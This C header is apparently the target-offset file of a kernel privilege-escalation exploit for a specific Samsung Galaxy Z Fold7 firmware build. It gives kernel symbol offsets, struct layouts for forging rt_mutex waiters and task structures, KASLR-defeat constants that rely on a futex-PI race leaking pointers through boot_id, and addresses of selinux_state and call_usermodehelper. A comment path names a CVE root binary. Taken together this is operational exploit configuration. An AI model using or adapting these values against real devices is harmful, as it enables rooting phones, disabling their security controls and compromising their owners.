#ifndef OFFSET_H
#define OFFSET_H

// ============================================================================
// target.h — Samsung Galaxy Z Fold7 (SM-F966B / board "q7q" / "sun")
// ============================================================================
//
// Device:  Samsung Galaxy Z Fold7 (SM-F966B)
// SoC:     Qualcomm Snapdragon 8 Gen 3 "for Galaxy" (SM8650, codename "Kera")
// Build:   BP2A.250605.031.A3 / F966BXXS8AZC2 / F966BOXM8AZB6
// Android: 16 (SDK 36)
// Kernel:  Linux 6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k
//          compiled with Clang 18 (PGO + BOLT + LTO + MLGO), LLD 18
//
// Provenance tags:
//   [ELF]    — llvm-nm on vmlinux.elf reconstructed from stock boot.img
//   [BTF]    — bpftool / Python BTF parser on raw BTF blob from kernel Image
//   [ASM]    — llvm-objdump disassembly of function body in vmlinux.elf
//   [IMGHDR] — ARM64 kernel Image header (text_offset, flags, etc.)
//   [KCONF]  — kernel source from SM-F966B_16_Opensource
//   [SRC]    — derived from kernel source trace.h enum
//   [CALC]   — derived arithmetically from verified adjacent constants
//   [PORT]   — ported from verified pa3q-S938NKSUACZF1 6.6 kernel target
// ============================================================================

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "q7q-F966BXXS8AZC2-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "q7q-F966BXXS8AZC2-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/q7qxxx/qssi_64:16/BP2A.250605.031.A3/F966BXXS8AZC2:user/release-keys"
#endif

// ─── Memory map ────────────────────────────────────────────────────────────
// [ELF]   KIMAGE_TEXT_BASE — first symbol in kallsyms (_text).
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
// [IMGHDR] text_offset=0x0 → P0_KERNEL_PHYS_LOAD = P0_PHYS_OFFSET + 0
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define SKB_DATA_DELTA (-0xe80LL)

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1

// ─── Slide (KASLR-defeat) constants ────────────────────────────────────────
// [SRC]   __TRACE_LAST_TYPE = 20 from kernel_platform/msm-kernel/kernel/trace/trace.h
// [ELF]   __start_ftrace_events = 0x02180110, __event_sched_blocked_reason = 0x021803d8
// [CALC]  event_index = (0x021803d8 - 0x02180110) / 8 = 89
// [CALC]  event_id    = __TRACE_LAST_TYPE (20) + event_index (89) = 109
#define SLIDE_TRACEFS_EVENT_ID 109
// [ASM]   worker_thread+0x698: bl schedule; return PC = worker_thread + 0x69c
// [CALC]  SLIDE_TRACEFS_WORKER_CALLER_OFF = (worker_thread + 0x69c) - KIMAGE_TEXT_BASE
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dac80ULL
// [PORT]  All 6.6 Samsung targets verified at 0; needs on-device confirmation.
#define SLIDE_PSELECT_WORD_SHIFT 0

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/q7q-F966BXXS8AZC2/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END  0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ─── Kernel-image-relative symbol offsets ──────────────────────────────────
// Every symbol below: llvm-nm -n vmlinux.elf → raw address → offset =
// address - KIMAGE_TEXT_BASE (0xffffffc080000000).

// --- ashmem driver ----------------------------------------------------------
// [ELF] llvm-nm vmlinux.elf
#define ASHMEM_MISC_FOPS_OFF     0x0232cd70ULL // ashmem_misc + offsetof(miscdevice,fops)=0x10
#define ASHMEM_FOPS_OFF          0x01379928ULL // ashmem_fops
#define ASHMEM_IOCTL_OFF         0x00cefa04ULL // ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF  0x00cf00c0ULL // compat_ashmem_ioctl
#define ASHMEM_MMAP_OFF          0x00cf0114ULL // ashmem_mmap
#define ASHMEM_OPEN_OFF          0x00cf0334ULL // ashmem_open
#define ASHMEM_RELEASE_OFF       0x00cf03bcULL // ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF   0x00cf0448ULL // ashmem_show_fdinfo

// --- configfs / vfs helpers -------------------------------------------------
// [ELF] llvm-nm vmlinux.elf
#define CONFIGFS_READ_ITER_OFF       0x00488bc8ULL // configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x004890f4ULL // configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF         0x0040b1c0ULL // copy_splice_read
#define NOOP_LLSEEK_OFF              0x003be1e0ULL // noop_llseek

// --- kernel data symbols ----------------------------------------------------
// [ELF] llvm-nm vmlinux.elf
#define INIT_TASK_OFF             0x021ce4c0ULL // init_task
#define ROOT_TASK_GROUP_OFF       0x023c3d80ULL // root_task_group
#define SELINUX_ENFORCING_OFF     0x02406360ULL // selinux_state (enforcing @ +0)
#define KMALLOC_CACHES_OFF        0x01710e50ULL // kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF     0x011cc4c8ULL // anon_pipe_buf_ops

// --- Computed addresses (KIMAGE_TEXT_BASE + offset) -------------------------
#define ASHMEM_MISC_FOPS        (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS             (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL            (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL     (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP             (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN             (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE          (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO      (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ        (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK             (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK               (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP         (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING       (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES          (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS       (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

// ─── Root UMH (call_usermodehelper) ────────────────────────────────────────
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
// [ELF] llvm-nm vmlinux.elf
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d2394ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x021bae60ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

// ─── Slide (pre-KASLR leak) targets ────────────────────────────────────────
// The slide leak uses a pselect / futex-PI race to write the P0 data-alias of
// the nfulnl_logger object into the random/boot_id ctl_table->data pointer,
// then reads /proc/sys/kernel/random/boot_id to leak a kernel text pointer.

// [ELF]   llvm-nm vmlinux.elf: "nfnetlink_log" string in Image
#define SLIDE_NFULNL_LOGGER_NAME_OFF     0x016a016eULL
// [ELF]   llvm-nm vmlinux.elf: nfulnl_logger instance
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF   0x021c2278ULL
// [PORT]  tree node parent-color restore value
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
// [ELF]   random_table entry[4] (boot_id) → data ptr field
//         random_table @ 0x022ea050, entry[4].data @ + (4*64 + 8) = 0x022ea158
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x022ea158ULL
#define SLIDE_INIT_TASK_OFF       INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
// [ELF]   sysctl_bootid .bss symbol
#define SLIDE_SYSCTL_BOOTID_OFF   0x024a83f8ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ─── Page layout offsets ───────────────────────────────────────────────────
#define LOCK_OFF         0x2210
#define W0_OFF           0x2350
#define FOPS_OFF         0x2000
#define SCRATCH_OFF      0x3000
#define RIGHT_OFF        0x4440
#define LEFT_OFF         0x5550
#define FAKE_TASK_OFF    0x3200

// ─── struct rt_mutex_waiter field offsets (Linux 6.6.57 / aarch64) ─────────
// [BTF]   Verified with raw BTF parser against vmlinux.btf from kernel Image.
//         sizeof(struct rt_mutex_waiter) = 112 (0x70).
//         tree (rb_node) @ 0x00, pi_tree (rb_node) @ 0x28 (NOT 0x18 like 6.1!).
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68
#define FAKE_WAITER_LAYOUT_SIZE         0x70

// ─── struct task_struct field offsets (Linux 6.6.57 / aarch64) ─────────────
// [BTF]   Verified with raw BTF parser — all match pa3q 6.6 kernel layout.
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348
#define FAKE_TASK_PI_LOCK_OFF       0x90c
#define FAKE_TASK_PI_WAITERS_OFF    0x920
#define FAKE_TASK_PI_TOP_TASK_OFF   0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

// ─── struct configfs_buffer offsets ────────────────────────────────────────
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

// ─── Workqueue struct offsets ──────────────────────────────────────────────
#define WQ_DFL_PWQ_OFF       0xb0
#define PWQ_POOL_OFF          0x00
#define PWQ_WQ_OFF            0x08
#define PWQ_WORK_COLOR_OFF    0x10
#define PWQ_REFCNT_OFF        0x18
#define PWQ_NR_IN_FLIGHT_OFF  0x1c
#define PWQ_NR_ACTIVE_OFF     0x5c
#define PWQ_MAX_ACTIVE_OFF    0x60
#define POOL_WORKLIST_OFF     0x28
#define POOL_NR_IDLE_OFF      0x3c

#define WORK_DATA_OFF         0x00
#define WORK_ENTRY_OFF        0x08
#define WORK_FUNC_OFF         0x18

// ─── Slab / page struct offsets ────────────────────────────────────────────
#define STRUCT_PAGE_SIZE               0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x08
// [BTF]    Linux 6.6 slab rework: cache pointer at offset 0x08 in struct slab
#define STRUCT_SLAB_CACHE_OFF          0x08
#define STRUCT_PAGE_TYPE_OFF           0x30

// ─── Pipe buffer ───────────────────────────────────────────────────────────
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10

// ─── struct file_operations field offsets (Linux 6.6.57 / aarch64) ─────────
// [BTF]   Verified with raw BTF parser. Standard 6.6 layout — no Samsung-
//         specific iopoll/splice_eof shift (those are already upstream in 6.6).
//         sizeof(struct file_operations) = 0x118 (280 bytes).
#define FOPS_OWNER_OFF          0x00   // owner
#define FOPS_LLSEEK_OFF         0x08   // llseek
#define FOPS_READ_OFF           0x10   // read
#define FOPS_WRITE_OFF          0x18   // write
#define FOPS_READ_ITER_OFF      0x20   // read_iter
#define FOPS_WRITE_ITER_OFF     0x28   // write_iter
#define FOPS_IOCTL_OFF          0x48   // unlocked_ioctl
#define FOPS_COMPAT_IOCTL_OFF   0x50   // compat_ioctl
#define FOPS_MMAP_OFF           0x58   // mmap
#define FOPS_OPEN_OFF           0x68   // open
#define FOPS_RELEASE_OFF        0x78   // release
#define FOPS_SPLICE_READ_OFF    0xb8   // splice_read
#define FOPS_SHOW_FDINFO_OFF    0xd8   // show_fdinfo

#endif
